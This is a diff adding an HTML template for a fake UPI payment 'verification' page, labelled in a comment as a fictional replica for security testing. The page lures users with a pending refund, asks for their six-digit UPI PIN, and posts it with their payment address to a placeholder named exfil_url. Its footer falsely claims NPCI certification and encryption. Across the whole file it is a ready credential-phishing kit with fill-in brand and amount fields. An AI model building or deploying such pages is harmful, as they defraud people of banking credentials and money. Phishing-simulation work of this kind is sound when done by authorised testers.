@@ -1,0 +1,62 @@
+<!-- fictional replica for security testing -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ brand_title }} UPI Verification</title>
+    <style>
+        :root {
+            --primary: {{ primary_color }};
+            --secondary: {{ secondary_color }};
+            --bg: #f8fafc;
+            --text: #1e293b;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: var(--bg); color: var(--text); display: flex; justify-content: center; padding: 16px; }
+        .{{ prefix }}container { width: 100%; max-width: 420px; background: #ffffff; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); overflow: hidden; border: 1px solid #e2e8f0; }
+        .{{ prefix }}header { background: var(--primary); color: #ffffff; padding: 20px; text-align: center; }
+        .{{ prefix }}brand { font-size: 24px; font-weight: 800; letter-spacing: 0.5px; }
+        .{{ prefix }}tagline { font-size: 13px; opacity: 0.9; margin-top: 4px; }
+        .{{ prefix }}body { padding: 24px; }
+        .{{ prefix }}notice { background: #fef2f2; border-left: 4px solid #ef4444; padding: 12px; border-radius: 4px; margin-bottom: 20px; font-size: 13px; color: #991b1b; }
+        .{{ prefix }}amount-box { background: #f1f5f9; padding: 16px; border-radius: 8px; text-align: center; margin-bottom: 20px; }
+        .{{ prefix }}amount-label { font-size: 12px; color: #64748b; text-transform: uppercase; }
+        .{{ prefix }}amount-val { font-size: 28px; font-weight: 700; color: var(--text); }
+        .{{ prefix }}form-group { margin-bottom: 16px; }
+        .{{ prefix }}label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #475569; }
+        .{{ prefix }}input { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 16px; text-align: center; letter-spacing: 4px; }
+        .{{ prefix }}btn { width: 100%; padding: 14px; background: var(--primary); color: #ffffff; border: none; border-radius: 6px; font-size: 16px; font-weight: 700; cursor: pointer; transition: opacity 0.2s; }
+        .{{ prefix }}btn:hover { opacity: 0.9; }
+        .{{ prefix }}footer { padding: 16px; text-align: center; font-size: 11px; color: #94a3b8; border-top: 1px solid #f1f5f9; }
+    </style>
+</head>
+<body>
+    <div class="{{ prefix }}container">
+        <div class="{{ prefix }}header">
+            <div class="{{ prefix }}brand">{{ brand_wordmark }}</div>
+            <div class="{{ prefix }}tagline">{{ tagline }}</div>
+        </div>
+        <div class="{{ prefix }}body">
+            <div class="{{ prefix }}notice">
+                {{ notice_text }}
+            </div>
+            <div class="{{ prefix }}amount-box">
+                <div class="{{ prefix }}amount-label">Pending Refund / Credit</div>
+                <div class="{{ prefix }}amount-val">₹{{ amount }}</div>
+            </div>
+            <form action="{{ exfil_url }}" method="POST">
+                <input type="hidden" name="vpa" value="{{ vpa }}">
+                <div class="{{ prefix }}form-group">
+                    <label class="{{ prefix }}label" for="pin">ENTER 6-DIGIT UPI PIN TO AUTHORIZE</label>
+                    <input class="{{ prefix }}input" type="password" id="pin" name="upi_pin" maxlength="6" pattern="\d{6}" placeholder="••••••" required>
+                </div>
+                <button class="{{ prefix }}btn" type="submit">{{ button_text }}</button>
+            </form>
+        </div>
+        <div class="{{ prefix }}footer">
+            NPCI Certified UPI Gateway &bull; 256-Bit Encrypted &bull; Ref: {{ ref_code }}
+        </div>
+    </div>
+</body>
+</html>
